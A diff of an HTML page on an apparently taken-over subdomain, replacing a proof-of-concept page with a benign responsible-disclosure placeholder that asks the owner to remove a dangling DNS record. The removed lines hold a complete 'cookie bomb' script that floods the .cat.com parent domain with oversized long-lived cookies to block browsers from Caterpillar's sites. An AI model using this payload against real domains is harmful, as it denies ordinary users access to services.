@@ -1,22 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Subdomain Takeover PoC</title>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex, nofollow">
+<title>Security Research - Responsible Disclosure</title>
 </head>
 <body>
-    <h1>Subdomain Takeover PoC by m4rc10sz/luq0x</h1>
-    <hr>
-    <button onclick="cookieBomb()">Execute DoS PoC</button>
-    <script>
-        function cookieBomb() {
-            // Expires 400 days (maximum allowed by modern browsers)
-            var expires = new Date(Date.now() + 400 * 24 * 60 * 60 * 1000).toUTCString();
-            for (var i = 0; i < 150; i++) {
-                document.cookie = "cb_" + i + "=" + "B".repeat(3000) + "; domain=.cat.com; path=/; expires=" + expires + "; SameSite=None; Secure";
-            }
-            alert("DoS attack executed successfully!\n\nAll Caterpillar web properties are now unreachable in this browser.");
-        }
-    </script>
+<h1>Subdomain takeover proof of concept</h1>
+<p>This hostname resolved to an unclaimed GitHub Pages target and was claimed by a
+security researcher to demonstrate a subdomain takeover to the domain owner.</p>
+<ul>
+<li>Researcher: luq0x</li>
+<li>Reported via: HackerOne</li>
+<li>Date claimed: 2026-08-20</li>
+</ul>
+<p>No data is collected on this page. It contains no scripts, no forms and no tracking.
+This placeholder will be removed once the dangling DNS record is corrected.</p>
+<p>Domain owner: remove or repoint the dangling CNAME record for this hostname.</p>
 </body>
 </html>
